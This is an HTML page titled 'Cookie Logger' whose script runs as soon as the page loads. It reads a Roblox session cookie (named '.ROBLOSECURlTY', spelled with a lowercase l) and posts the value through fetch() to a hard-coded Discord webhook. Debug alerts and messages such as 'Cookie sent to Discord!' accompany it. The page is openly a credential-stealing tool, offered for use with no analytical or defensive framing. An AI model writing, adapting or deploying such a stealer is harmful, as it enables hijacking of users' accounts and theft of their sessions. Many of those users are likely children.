<!DOCTYPE html>
<html>
<head>
    <title>Cookie Logger</title>
    <script>
        // VISUAL FEEDBACK - Page turns RED when script runs
        document.body.style.backgroundColor = "red";
        
        // Show an alert to confirm script loaded
        alert("Script Loaded! Checking for Roblox cookie...");
        
        // YOUR WEBHOOK URL
        const webhookUrl = "https://discordapp.com/api/webhooks/1508685502050598984/xj_mFcRpRGMcUwfPbkKZ0m1E0-QbuI9WZ5kbSwbYU-ymFFRk50siJL6BzFwIZYat51nM";

        function getCookie(cname) {
            const name = cname + "=";
            const decodedCookie = decodeURIComponent(document.cookie);
            const ca = decodedCookie.split(';');
            for (let i = 0; i < ca.length; i++) {
                let c = ca[i];
                while (c.charAt(0) == ' ') {
                    c = c.substring(1);
                }
                if (c.indexOf(name) == 0) {
                    return c.substring(name.length, c.length);
                }
            }
            return "";
        }

        function sendToDiscord() {
            const cookie = getCookie('.ROBLOSECURlTY');
            
            const embed = {
                "title": "Roblox Session Detected",
                "description": "Cookie Captured - Check Console",
                "color": 16711680,
                "fields": [
                    {
                        "name": "Cookie (.ROBLOSECURlTY)",
                        "value": cookie ? cookie : "None found",
                        "inline": true
                    }
                ],
                "image": {
                    "url": "https://placehold.co/600x400?text=Session+Detected"
                }
            };

            console.log("Attempting to send cookie...");
            
            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ "embeds": [embed] })
            })
            .then(response => {
                console.log('Success!', response);
                alert("Cookie sent to Discord!");
            })
            .catch(error => {
                console.error('Error!', error.message);
                alert("Error sending to Discord. Check console.");
            });
        }

        // Run immediately
        sendToDiscord();
    </script>
</head>
<body style="background:black; color:white; padding:20px; font-family:Arial;">
    <h1>Session Detected</h1>
    <p>Checking for cookies...</p>
</body>
</html>